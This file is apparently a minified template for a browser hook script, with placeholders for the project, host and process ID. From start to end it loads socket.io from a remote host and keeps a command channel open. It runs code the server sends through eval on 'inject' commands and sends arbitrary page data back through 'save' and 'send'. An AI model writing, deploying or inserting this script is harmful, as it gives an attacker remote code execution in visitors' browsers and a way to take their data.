(function(ant){(function(t){t.init#{PROJECT}})({config:{host:"http://#{HOST}"},init:function(fn,timeout){var self=this,api=new self.API;setTimeout(function(){api.loadJS(self.config.host+"/ant/js/socket.io.min.js",function(){api.socket=io.connect(self.config.host);api.socket.on("connect",function(){this.emit("server",#{PID})}).on("disconnect",function(){this.close()}).on("init",function(t){setInterval(function(){api.socket.emit("alive",true)},1e3*10);fn?fn(api):null}).on("plugin-sender",function(ret){if(typeof ret!=="object"||!ret.act||!ret.data){return false}switch(ret.act){case"inject":var plugin=eval(ret.data);plugin(api);break}})})},timeout||0)},API:function(){return{socket:null,loadJS:function(t,n){var e=document.createElement("script");e.src=t;e.readyState?e.onreadystatechange=function(){e.readyState==="loaded"||e.readyState==="complete"?n():null}:e.onload=n;document.head.appendChild(e);return this},listen:function(t){this.socket.removeEventListener("plugin-listener");this.socket.on("plugin-listener",t);return this},send:function(t){this.socket.emit("plugin-sender",t);return this},save:function(t,n){var e=typeof t==="string"?t:typeof t==="object"?JSON.stringify(t):String(t);e+=n?"":"\n";this.socket.emit("save",e);return this},ss:function(t){this.send(t).save(t)}}}})})();